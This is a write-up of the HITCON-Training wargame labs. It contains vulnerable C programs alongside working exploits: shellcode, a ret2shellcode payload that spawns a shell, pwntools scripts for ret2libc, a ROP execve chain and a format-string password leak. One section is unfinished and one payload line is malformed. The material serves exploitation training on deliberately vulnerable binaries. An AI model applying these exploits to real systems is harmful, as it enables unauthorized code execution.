---
title: HITCON-Training writeups
tags: assignment4 hitcon-training wargame writeup
---

https://github.com/scwuaptx/HITCON-Training

## 1. sysmagic
sysmagic.c
```c
#include <stdio.h>
#include <unistd.h>

void get_flag(){
	int fd ;
	int password;
	int magic ;
	char key[] = "Do_you_know_why_my_teammate_Orange_is_so_angry???";
	char cipher[] = {7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66};
	fd = open("/dev/urandom",0);
	read(fd,&password,4);
	printf("Give me maigc :");
	scanf("%d",&magic);
	if(password == magic){
		for(int i = 0 ; i < sizeof(cipher) ; i++){
			printf("%c",cipher[i]^key[i]);
		}
	}
}

int main(){
	setvbuf(stdout,0,2,0);
	get_flag();
	return 0 ;
}
```

I used gdb to jump to the for loop

```bash
gdb-peda$ jump *0x08048724
Continuing at 0x8048724.
CTF{debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!}[Inferior 1 (process 8862) exited normally]
Warning: not running
gdb-peda$
```


## 2. orw
orw.bin <main>
```nasm
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048548 <+0>:	lea    ecx,[esp+0x4]
   0x0804854c <+4>:	and    esp,0xfffffff0
   0x0804854f <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048552 <+10>:	push   ebp
   0x08048553 <+11>:	mov    ebp,esp
   0x08048555 <+13>:	push   ecx
   0x08048556 <+14>:	sub    esp,0x4
   0x08048559 <+17>:	call   0x80484cb <orw_seccomp>
   0x0804855e <+22>:	sub    esp,0xc
   0x08048561 <+25>:	push   0x80486a0
   0x08048566 <+30>:	call   0x8048380 <printf@plt>
   0x0804856b <+35>:	add    esp,0x10
   0x0804856e <+38>:	sub    esp,0x4
   0x08048571 <+41>:	push   0xc8
   0x08048576 <+46>:	push   0x804a060
   0x0804857b <+51>:	push   0x0
   0x0804857d <+53>:	call   0x8048370 <read@plt>
   0x08048582 <+58>:	add    esp,0x10
   0x08048585 <+61>:	mov    eax,0x804a060
   0x0804858a <+66>:	call   eax
   0x0804858c <+68>:	mov    eax,0x0
   0x08048591 <+73>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048594 <+76>:	leave
   0x08048595 <+77>:	lea    esp,[ecx-0x4]
   0x08048598 <+80>:	ret
End of assembler dump.
```

the main function reads 200 bytes of input to ``0x804a060 <shellcode>``
and calls the ``<shellcode>``

orw.py
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "training.pwnable.tw"
port = "11002"

r = remote(host,port)
r.recvuntil(":")
sc = "\xeb\x20\x5b\x31\xc0\xb0\x05\x31\xc9\xcd\x80\x89\xc3\xb0\x03\x89\xe1\xb2\x30\xcd\x80\xb0\x04\xb3\x01\xb2\x30\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xdb\xff\xff\xff/home/orw/flag\x00"
r.sendline(sc)
r.interactive()
```

the python code sends shellcode to remote host but the host seems down.
So I've created a test flag file

/home/junheah/flag
```
this_is_test_flag
```

and tested the shellcode locally

```bash
junheah@ubuntu:~/HITCON-Training-master/LAB/lab2$ python -c 'print "\xeb\x20\x5b\x31\xc0\xb0\x05\x31\xc9\xcd\x80\x89\xc3\xb0\x03\x89\xe1\xb2\x30\xcd\x80\xb0\x04\xb3\x01\xb2\x30\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xdb\xff\xff\xff/home/junheah/flag\x00"'|./orw.bin
Give my your shellcode:this_is_test_flag
��������76��������
```


## 3. ret2sc
ret2sc.c
```c
#include <stdio.h>

char name[50];

int main(){
	setvbuf(stdout,0,2,0);
	printf("Name:");
	read(0,name,50);
	char buf[20];
	printf("Try your best:");
	gets(buf);
	return ;
}
```

``ret2sc.py`` is python code to test the exploit code remotely

main function ``read`` 50 bytes to global variable ``name`` and gets input to local variable ``buf`` using ``gets``
By looking at the disassembled code, I found out that ``name`` is at 0x804a060
Since ``name`` is at a fixed location, I chose to put shellcode to that location and overwrite the return address of main function with its offset

``gets`` is saved at ebp-0x14

first input:
1. shellcode (41 bytes)
2. dummy data (9 bytes)

second input:
1. dummy data (24+a bytes)
2. return address (4 bytes)

final payload
```python
python -c 'print "<shellcode>\n" +  + "a"*32 "\x60\xa0\x04\x08\n"'
```

```bash
junheah@ubuntu:~/HITCON-Training-master/LAB/lab3$ (python -c 'print "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "b"*9 + "a"*32 + "\x60\xa0\x04\x08\n"';cat) | ./ret2sc
Name:Try your best:whoami
junheah
pwd
/home/junheah/HITCON-Training-master/LAB/lab3
```


## 4. ret2lib
ret2lib.c
```c
#include <stdio.h>

void See_something(unsigned int addr){
	int * address ;
	address = (int * )addr ;
	printf("The content of the address : %p\n",* address);
};

void Print_message(char * mesg){
	char buf[48];
	strcpy(buf,mesg);
	printf("Your message is : %s",buf);
}

int main(){
	char address[10] ;
	char message[256];
	unsigned int addr ;
	puts("###############################");
	puts("Do you know return to library ?");
	puts("###############################");
	puts("What do you want to see in memory?");
	printf("Give me an address (in dec) :");
	fflush(stdout);
	read(0,address,10);
	addr = strtol(address);
	See_something(addr) ;
	printf("Leave some message for me :");
	fflush(stdout);
	read(0,message,256);
	Print_message(message);
	puts("Thanks you ~");
	return 0 ;
}
```

we could use the ``See_something`` function to leak the libc's address and call system function with ``Print_message`` function

exp.py
```python
from pwn import *
context.log_level='debug'

binary = ELF('./ret2lib')
lib = ELF('/lib/i386-linux-gnu/libc-2.23.so')

readoff = lib.symbols['read']
systemoff = lib.symbols['system']
binshoff = list(lib.search('/bin/sh'))[0]

readgot = binary.got['read']

r = process('./ret2lib')
r.recvuntil(' :')

r.sendline(str(readgot))

r.recvuntil('0x')
intstr = r.recvn(8)
read = int(intstr, 16)

libc = read - readoff

r.recvuntil(' :')

pl = ''
pl += 'a'*60
pl += p32(libc + systemoff)
pl += 'a'*4
pl += p32(libc + binshoff)
r.sendline(pl)

r.interactive()
```


## 5. simplerop
simplerop.c
```c
#include <stdio.h>

int main(){
	char buf[20];
	puts("ROP is easy is'nt it ?");
	printf("Your input :");
	fflush(stdout);
	read(0,buf,100);
}
```

the binary doesn't use libc, nor does it contain ``system`` function, so we have to use system interrupt (``int80``) to gain access to shell.

since ``.bss section`` is a writeable space, I figured we could store ``/bin/sh`` string

payload structure:

first payload (write /bin/sh to bss):
1. dummy data (24+a bytes)
2. return address of main : read
3. retrun address of read :
4. first arg for read : 0 (stdin)
5. second arg for read : bss
6. third arg for read : 8
7. return address for read : pop edx; pop ecx; pop ebx; ret
8. third arg for execve : 0
9. second arg for execve : 0
10. first arg for execve : * '/bin/sh'
11. return address for pop3ret : pop eax; ret
12. first arg for int80 : 0xb
13. return address for popret : int80

second payload:
1. '/bin/sh\x00'

exp.py
```python
from pwn import *
context.log_level='debug'

binary = ELF('./simplerop')

popret = 0x80481c9
pop2ret = 0x804838d
pop4ret = 0x804838b
pop3ret = 0x804838c
bss = 0x080eaf80
popdcbret = 0x0806e850
popeaxret = 0x080bae06
int80 = 0x80493e1

pl = ''
pl += 'a'*32
pl += p32(binary.symbols['read'])
pl += p32(pop3ret)
pl += p32(0)
pl += p32(bss)
pl += p32(len('/bin/sh\x00'))

pl += p32(popdcbret)
pl += p32(0)
pl += p32(0)
pl += p32(bss)

pl += p32(popeaxret)
pl += p32(0xb)
pl += p32(int80)

r = process('./simplerop')
r.sendline(pl)
r.sendline('/bin/sh\x00')

r.interactive()
```


## 6. migration
migration.c
```c
#include <stdio.h>

int count = 1337 ;

int main(){
	if(count != 1337)
		_exit(1);
	count++;
	char buf[40];
	setvbuf(stdout,0,2,0);
	puts("Try your best :");
	read(0,buf,64);
	return ;
}
```

checksec
```
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```
proc map
```
08048000-08049000 r-xp 00000000 08:01 1701150                            /home/junheah/HITCON-Training-master/LAB/lab6/migration
08049000-0804a000 r--p 00000000 08:01 1701150                            /home/junheah/HITCON-Training-master/LAB/lab6/migration
0804a000-0804b000 rw-p 00001000 08:01 1701150                            /home/junheah/HITCON-Training-master/LAB/lab6/migration
f7e03000-f7e04000 rw-p 00000000 00:00 0
f7e04000-f7fb4000 r-xp 00000000 08:01 1051955                            /lib/i386-linux-gnu/libc-2.23.so
f7fb4000-f7fb6000 r--p 001af000 08:01 1051955                            /lib/i386-linux-gnu/libc-2.23.so
f7fb6000-f7fb7000 rw-p 001b1000 08:01 1051955                            /lib/i386-linux-gnu/libc-2.23.so
f7fb7000-f7fba000 rw-p 00000000 00:00 0
f7fd3000-f7fd4000 rw-p 00000000 00:00 0
f7fd4000-f7fd7000 r--p 00000000 00:00 0                                  [vvar]
f7fd7000-f7fd9000 r-xp 00000000 00:00 0                                  [vdso]
f7fd9000-f7ffc000 r-xp 00000000 08:01 1046619                            /lib/i386-linux-gnu/ld-2.23.so
f7ffc000-f7ffd000 r--p 00022000 08:01 1046619                            /lib/i386-linux-gnu/ld-2.23.so
f7ffd000-f7ffe000 rw-p 00023000 08:01 1046619                            /lib/i386-linux-gnu/ld-2.23.so
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
```

We only have about 20 bytes to work with, which makes it impossible to rop.
What we have to do here is change the stack position by faking the ebp.
I chose ``data`` section to use it as second stack

but since the binary is protected with full relro, ``data`` section cannot be written.


first payload:
1.


## 7. crack
crack.c
```c
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>

unsigned int password ;

int main(){

	setvbuf(stdout,0,2,0);
	char buf[100];
	char input[16];
	int fd ;
	srand(time(NULL));
	fd = open("/dev/urandom",0);
	read(fd,&password,4);
	printf("What your name ? ");
	read(0,buf,99);
	printf("Hello ,");
	printf(buf);
	printf("Your password :");
	read(0,input,15);
	if(atoi(input) != password){
		puts("Goodbyte");
	}else{
		puts("Congrt!!");
		system("cat /home/crack/flag");
	}
}
```
checksec
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

bof doesn't seem to be possible, but since ``printf`` prints out the buffer directly, its vulnerable to format string bug.

By inputting multiple ``%x`` specifiers, I found out that the password is at the 10th ``%x``

exp.py
```python
from pwn import *
context.log_level = 'debug'

p = process("./crack")
pwd = 0x804a048
p.recvuntil("?")

p.sendline(p32(pwd) + "@%10$s@" )
p.recvuntil("@")
pwd = p.recvuntil("@")
pwd = u32(pwd[:4])
print pwd
p.recvuntil(":")

p.sendline(str(pwd))
p.interactive()
```
